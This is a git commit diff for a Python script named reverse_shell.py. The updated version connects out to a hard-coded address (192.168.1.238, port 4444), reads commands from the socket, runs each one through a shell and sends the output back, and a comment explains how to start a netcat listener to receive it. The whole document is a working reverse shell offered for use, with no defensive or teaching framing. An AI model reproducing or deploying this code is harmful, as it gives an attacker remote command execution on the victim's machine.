1048d1fcb01395497d691fb546a58c8dbce946e5
hackerman234 <56136248+hackerman234@users.noreply.github.com>
2020-02-02 17:12:20 -0500

    Update reverse_shell.py

--- reverse_shell.py
+++ reverse_shell.py
@@ -2,17 +2,26 @@
 # set up a netcat listner
 # nc -lvp 4444
 # tested only on linux
+# @hackerman234
 
 import socket
 import os
 import subprocess
-import pty
 
-def connection():
-    host = "192.168.1.238" # Change this to your IP
-    port = 4444            # Change the port if you want to
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))   
+class MySock:
+    def connection(self):
+        host = "192.168.1.238" # Change this to your IP
+        port = 4444            # Change the port if you want to
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((host, port))   
 
-connection()
-
+    def shell_spawn(self):
+        while True:
+            commands = self.s.recv(1024)
+            cmd = subprocess.Popen(commands, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            self.s.send(cmd.stdout.read())
+            
+if __name__ == '__main__':
+    my_sock = MySock()
+    my_sock.connection()
+    my_sock.shell_spawn()
